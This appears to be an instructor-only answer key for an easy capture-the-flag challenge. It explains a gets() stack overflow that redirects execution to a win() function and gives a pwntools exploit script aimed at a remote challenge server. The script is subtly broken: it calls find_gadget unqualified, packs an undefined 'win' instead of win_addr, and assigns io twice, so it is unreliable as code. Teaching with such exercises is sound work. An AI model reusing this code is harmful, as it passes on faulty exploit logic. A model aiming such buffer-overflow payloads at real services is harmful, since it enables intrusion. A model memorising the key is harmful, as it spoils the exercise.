# Easy 1 — win_function  (Instructor Only)
## Vulnerability
`gets()` in vuln() overflows 64-byte buffer → overwrite saved RIP → jump to win().
## Exploit
```python
from pwn import *

elf = context.binary = ELF("./chall")
io = elf.process()

io = remote("hidryx.com", 5001)

rop = ROP(elf)
ret_addr = find_gadget(['ret'])[0]
win_addr = elf.symbols["win"]

pay = b"A"*64           # offset 
pay += b"B"*8           # saved RBP
pay += p64(ret_addr)    # return 
pay += p64(win)         # win addr

io.sendline(pay)
io.interactive()
```
